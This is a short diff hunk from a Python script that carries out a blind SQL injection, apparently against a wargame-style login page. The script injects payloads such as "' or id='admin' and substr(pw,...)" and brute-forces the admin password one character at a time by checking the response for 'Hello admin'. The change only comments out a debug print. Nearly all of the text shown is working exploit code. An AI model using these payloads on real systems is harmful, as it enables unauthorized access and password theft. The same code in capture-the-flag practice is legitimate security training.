@@ -26,7 +26,7 @@ for idx in range(1, password_len + 1):
         # data = "?pw=' or id='admin' and pw like '{}{}%".format(password,i)
         # data = "?pw=' or id='admin' and ord(substr(pw,{},1))={}%23".format(idx,ord(i))
         data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
-        print(data)
+        # print(data)
         response = requests.get(url + data, headers=header)
         if response.text.find("Hello admin") != -1:
             password = password + i
